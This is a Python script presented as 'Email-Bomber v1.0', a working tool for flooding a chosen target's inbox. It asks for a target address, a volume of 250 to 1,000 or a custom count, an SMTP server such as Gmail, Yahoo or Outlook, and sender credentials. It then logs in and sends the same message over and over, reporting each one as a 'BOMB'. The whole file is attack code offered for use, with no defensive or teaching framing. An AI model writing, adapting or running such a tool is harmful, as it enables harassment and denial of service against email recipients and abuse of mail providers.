import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[+[+[+[+[+[+[ Email-Bomber v1.0 ]+]+]+]+]+]+]+]+]+')
    print(bcolors.RED + '''                           
    
                                 _ ___                 _ _ 
                                |  ___|               (_) |
                                | |___ _ __ ___   __ _ _| |
                                | |___| '_ ` _ \ / _` | | |
                                | |___  | | | | | (_| | | |
                                |_____|_| |_| |_|\__,_|_|_|
                                     _                     _     
                                    | |                   | |    
                                    | |__   ___  _ __ ___ | |__  
                                    | '_ \ / _ \| '_ ` _ \| '_ \ 
                                    | |_) | (_) | | | | | | |_) |
                                    |_.__/ \___/|_| |_| |_|_.__/ 
                                    
                                           . . .                         
                                            \|/                          by
                                          `--+--'                           MADDOG
                                            /|\                          
                                           ' | '                         
                                             |                                   
                                         ,--'#`--.                       
                                         |#######|                      
                                      _.-'#######`-._                 
                                   ,-'###############`-.                 
                                 ,'#####################`,              
                                /#########################\                             
                               |###########################|            
                              |#############################|            
                              |#############################|            
                              |#############################|            
                              |#############################|            
                               |###########################|             
                                \#########################/              
                                 `.#####################,'               
                                   `._###############_,'                 
                                      `--..#####..--'                                      ,''.
*_______________________________________________________________________________________,'(Bomb)
                                                                                           `---' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email: '))
            self.mode = int(input(bcolors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up Bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up Email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server or select options - 1:Gmail 2:Yahoo 3:Outlook: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number: '))

            if default_port:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAdder = str(input(bcolors.GREEN + 'Enter from address: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject: '))
            self.message = str(input(bcolors.GREEN + 'Enter message: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAdder, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAdder, self.fromPwd)

        except Exception as e:
            print(f'ERROR:{e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAdder, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')

        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print('\n+[+[+[ Attacking Finished ]+]+]+')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()